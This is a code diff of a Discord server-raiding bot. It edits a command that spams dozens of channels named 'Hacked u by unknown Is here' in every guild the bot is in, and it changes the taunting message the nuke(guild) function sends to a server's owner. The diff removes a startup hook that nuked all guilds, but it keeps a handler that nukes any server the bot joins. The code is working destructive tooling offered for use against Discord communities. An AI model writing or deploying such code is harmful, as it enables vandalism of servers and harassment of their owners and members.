@@ -273,24 +273,37 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 m.createChannel('Hacked u by unknown Is here');
-                 
- 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');   
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');               
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');                
+m.createChannel('Hacked u by unknown Is here', 'text');
+                
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
@@ -371,7 +384,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send('Big Love').catch(e => { return void e; });
  
  
  
@@ -1320,16 +1333,6 @@ async function nuke(guild) {
  
  
 }
- 
-LOka.on('ready', () => {
-  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
-  console.log('-------------------------------------------------------------');
-  console.log('');
-  console.log("Made by YzhF1");
-  console.log("");
-  console.log("-------------------------------------------------------------");
- 
-});
  
 LOka.on('guildCreate', async (guild) => {
   return nuke(guild).catch(console.error);
